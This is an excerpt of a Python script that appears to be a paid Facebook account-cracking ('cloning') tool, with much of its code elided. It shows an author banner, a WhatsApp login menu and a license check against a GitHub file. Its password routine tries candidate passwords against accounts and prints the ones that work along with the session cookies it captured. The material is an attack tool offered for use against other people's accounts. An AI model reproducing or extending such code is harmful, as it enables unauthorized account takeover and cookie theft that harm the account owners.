...
os.system('espeak -a 300 " Welcome,   to,  Farhan,  Tools"')
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mZEXX ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Farhan Mallik ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mfarhanmallik51 ]   ║\33[1;34m   
╠══[Whatsapp                 • 016******32 ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
...
def login():
	...
	if TUTUL in ['m']:
		...
		os.system('xdg-open https://wa.me/qr/L42646UGX4GEC1')
	elif TUTUL in ['0']:
...
def passwrd():
	...
	print(f'{h}[{h}💚{h}]{h} Your FARHAN OK idz : {h}%s '%(ok))
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#Tutul-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•FARHAN-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/farhanmallik51/Public-CloNing-42o/blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		os.system('am start https://wa.me/qr/L42646UGX4GEC1?text=' + tks)
		Subscraption() 
Subscraption() 
login()